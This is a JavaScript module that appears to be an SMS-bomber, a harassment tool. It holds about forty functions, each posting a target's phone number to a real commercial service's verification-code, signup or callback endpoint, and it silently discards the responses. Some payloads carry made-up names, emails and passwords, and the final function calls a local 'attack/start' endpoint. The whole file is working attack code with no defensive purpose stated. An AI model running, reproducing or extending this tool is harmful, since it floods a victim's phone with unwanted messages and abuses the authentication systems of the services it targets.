const axios = require("axios");
let email = "@gmail.com";

const instance = axios.create({
    "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"}
})

module.exports = {
    sunlight: async phone => {
        axios.post("https://api.sunlight.net/v3/customers/authorization/", {
            "phone": phone
        })
            .then(res => {
                // console.log("Отправлено Sunlight");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Sunlight");
            })
    },

    yandexEda: async phone => {
        axios.post("https://eda.yandex/api/v1/user/request_authentication_code", {
            "phone_number": "+" + phone
        })
            .then(res => {
                // console.log("Отправлено Yandex Eda");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Yandex Eda");
            })
    },

    prime: async phone => {
        axios.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", {
            "phone": phone
        })
            .then(res => {
                // console.log("Отправлено Prime");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Prime");
            })
    },

    youla: async phone => {
        axios.post("https://youla.ru/web-api/auth/request_code", {
            "phone": phone
        })
            .then(res => {
                // console.log("Отправлено Youla");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Youla");
            })
    },

    wowworks: async phone => {
        axios.post("https://api.wowworks.ru/v2/site/send-code", {
            "phone": phone,
            "type": 2
        })
            .then(res => {
                // console.log("Отправлено wowworks");
            })
            .catch(rej => {
                // console.log("Ошибка отправки wowworks");
            })
    },

    gotinder: async phone => {
        axios.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", {
            "phone_number": phone
        })
            .then(res => {
                // console.log("Отправлено Gotinder");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Gotinder");
            })
    },

    qlean: async phone => {
        axios.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", {
            "phone": phone
        })
            .then(res => {
                // console.log("Отправлено Qlean");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Qlean");
            })
    },

    ok: async phone => {
        axios.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", {
            "st.r.phone": "+" + phone
        })
            .then(res => {
                // console.log("Отправлено Ok");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Ok");
            })
    },


    ivi: async phone => {
        axios.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", {
            "phone": phone
        })
            .then(res => {
                // console.log("Отправлено IVI");
            })
            .catch(rej => {
                // console.log("Ошибка отправки IVI");
            })
    },

    rutube: async phone => {
        axios.post("https://rutube.ru/api/accounts/sendpass/phone", {
            "phone": "+" + phone
        })
            .then(res => {
                // console.log("Отправлено Rutube");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Rutube");
            })
    },

    rutaxi: async phone => {
        axios.post("https://moscow.rutaxi.ru/ajax_keycode.html", {
            'l': phone.slice(1),
            "c": "3"
        })
            .then(res => {
                // console.log("Отправлено Rutaxi");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Rutaxi");
            })
    },

    tinkoff: async phone => {
        axios.post("https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=RznyziZkeagDbs6SLIr13ZlfSjusxJbQ.m1-prod-api26&wuid=31ad89052c4944fd8cd55bcf419eefc1", {
            "phone": phone
        }, {
            headers: {
                'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                'Connection': 'keep-alive',
                'Host': 'api.tinkoff.ru',
                'origin': 'https://www.tinkoff.ru',
                'Referer': 'https://www.tinkoff.ru/login/'
            }
        })
            .then(res => {
                // console.log("Отправлено Tinkoff");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Tinkoff");
            })
    },

    menu: async phone => {
        axios.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html", {
            "phone": phone,
            "do": "phone"
        })
            .then(res => {
                // console.log("Отправлено Menu");
            })
            .catch(rej => {
                // console.log("Ошибка отправки Menu");
            })
    },

    dostaevsky: async phone => {
        axios.post("https://msk.dostaevsky.ru/ajax/feedback/", {
            "back_call": phone
        })
            .then(res => {
                // console.log(`Отправлено Dostaevsky`);
            })
            .catch(rej => {
                // console.log(`Ошибка отправки Dostaevsky`);
            })
    },

    cabinet: async phone => {
        axios.post("https://cabinet.wi-fi.ru/api/auth/by-sms", {
            "msisdn": phone
        })
            .then(res => {
                // console.log(`Отправлено cabinet`);
            })
            .catch(rej => {
                // console.log(`Ошибка отправки cabinet`);
            })
    },

    webbankir: async phone => {
        axios.post("https://ng-api.webbankir.com/user/v2/create", {
            "lastName": "иванов",
            "firstName": "иван",
            "middleName": "иванович",
            "mobilePhone": phone,
            "email": email,
            "smsCode": ""
        })
            .then(res => {
                // console.log(`Отправлено cabinet`);

            })
            .catch(rej => {
                // console.log(`Ошибка отправки cabinet`);
            })
    },

    uklon: async phone => {
        axios.post("https://uklon.com.ua/api/v1/account/code/send", {
            "phone": phone
        }, {
            "client_id": "6289de851fc726f887af8d5d7a56c635"
        })
            .then(res => {
                // console.log(`Отправлено cabinet`);

            })
            .catch(rej => {
                // console.log(`Ошибка отправки cabinet`);
            })
    },

    ubki: async phone => {
        axios.post("https://secure.ubki.ua/b2_api_xml/ubki/auth", {
            "doc": {
                "auth": {
                    "mphone": "+" + phone,
                    "bdate": "11.11.1999",
                    "deviceid": "00100",
                    "version": "1.0",
                    "source": "site",
                    "signature": "undefined",
                }
            }
        }, {
            "Accept": "application/json"
        })
            .then(res => {
                // console.log(`Отправлено cabinet`);

            })
            .catch(rej => {
                // console.log(`Ошибка отправки cabinet`);
            })
    },

    tiktok: async phone => {
        axios.post("https://m.tiktok.com/node-a/send/download_link", {
            "slideVerify": 0,
            "language": "ru",
            "PhoneRegionCode": "7",
            "Mobile": phone.slice(1),
            "page": {
                "pageName": "home",
                "launchMode": "direct",
                "trafficType": ""
            }
        })
            .then(res => {
                // console.log(`Отправлено cabinet`);

            })
            .catch(rej => {
                // console.log(`Ошибка отправки cabinet`);
            })
    },

    thehive: async phone => {
        axios.post("https://thehive.pro/auth/signup", {
            "phone": "+" + phone
        }).then(res => {

        }).catch(rej => {

        })
    },

    pizza33: async phone => {
        axios.get("https://auth.pizza33.ua/ua/join/check/", {
            "callback": "angular.callbacks._1", "email": email, "password": "123123123Ddd$$$pp", "phone": phone.slice(1), "utm_current_visit_started": 0, "utm_first_visit": 0, "utm_previous_visit": 0, "utm_times_visited": 0
        }).then(res => {

        }).catch(rej => {

        })
    },

    sportmasterUa: async phone => {
        axios.get("https://www.sportmaster.ua", {
            "module": "users", "action": "SendSMSReg", "phone": phone
        }).then(res => {

        }).catch(rej => {

        })
    },

    qlean: async phone => {
        axios.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", { "phone": phone }).then(res => { }).catch(rej => { });
    },

    qlean2: async phone => {
        axios.get("https://sso.cloud.qlean.ru/http/users/requestotp", { "Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/", "phone": phone, "clientId": "undefined", "sessionId": "8765" }).then(res => { }).catch(rej => { });
    },

    prosushi: async phone => {
        axios.post("https://www.prosushi.ru/php/profile.php", { "phone": "+" + phone, "mode": "sms" }).then(res => { }).catch(rej => { });
    },

    planetakino: async phone => {
        axios.get("https://cabinet.planetakino.ua/service/sms", { "phone": phone }).then(res => { }).catch(rej => { });
    },

    pizzasinizza: async phone => {
        axios.post("https://pizzasinizza.ru/api/phoneCode.php", { "phone": phone.slice(1) }).then(res => { }).catch(rej => { });
    },
    pizzakazan: async phone => {
        axios.post("https://pizzakazan.com/auth/ajax.php", { "phone": "+" + phone, "method": "sendCode" }).then(res => { }).catch(rej => { });
    },

    ozon: async phone => {
        axios.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", { "phone": phone, "otpId": 0 }).then(res => { }).catch(rej => { });
    },


    mistercash: async phone => {
        axios.get("https://my.mistercash.ua/ru/send/sms/registration", { "number": "+" + phone }).then(res => { }).catch(rej => { });
    },

    mts: async phone => {
        axios.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", { "msisdn": phone }).then(res => { }).catch(rej => { });
    },

    vsk: async phone => {
        axios.post("https://shop.vsk.ru/ajax/auth/postSms/", { "phone": phone }).then(res => { }).catch(rej => { });
    },

    citilink: async phone => {
        axios.post(`https://www.citilink.ru/registration/confirm/phone/+${phone}/`).then(res => { }).catch(rej => { });
    },

    icq: async phone => {
        axios.post("https://www.icq.com/smsreg/requestPhoneValidation.php", { "msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763" }).then(res => { }).catch(rej => { });
    },

    delimobil: async phone => {
        axios.post("https://api.delitime.ru/api/v2/signup", {
            "SignupForm[username]": phone,
            "SignupForm[device_type]": 3
        }).then(res => { }).catch(rej => { });
    },

    boosty: async phone => {
        axios.post("https://api.boosty.to/oauth/phone/authorize", { "client_id": "+" + phone }).then(res => { }).catch(rej => { });
    },

    dnsShop: async phone => {
        axios.post("https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/", {
            "phone": phone,
            "is_repeat": 0,
            "order_guid": 1
        }).then(res => { }).catch(rej => { });
    },

    modulBank: async phone => {
        axios.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone", {
            "FirstName": "Андрей",
            "CellPhone": phone,
            "Package": "optimal",
        }).then(res => { }).catch(rej => { });
    },

    moneyman: async phone => {
        axios.post("https://moneyman.ru/registration_api/actions/send-confirmation-code", {
            "data": "+" + phone
        }).then(res => { }).catch(rej => { });
    },

    lenta: async phone => {
        axios.post("https://lenta.com/api/v1/authentication/requestValidationCode", {
            "phone": phone
        }).then(res => { }).catch(rej => { })
    },

    koronapay: async phone => {
        axios.post("https://koronapay.com/transfers/online/api/users/otps", {
            "phone": phone
        }).then(res => { }).catch(rej => { });
    },

    b0mb3r: async phone => {
        axios.post("http://127.0.0.1:8080/attack/start", {
            "number_of_cycle": 1,
            "phone": `${phone}`
        }).then(res => {console.log("Good")}).catch(err => {console.log(err)})
    }



}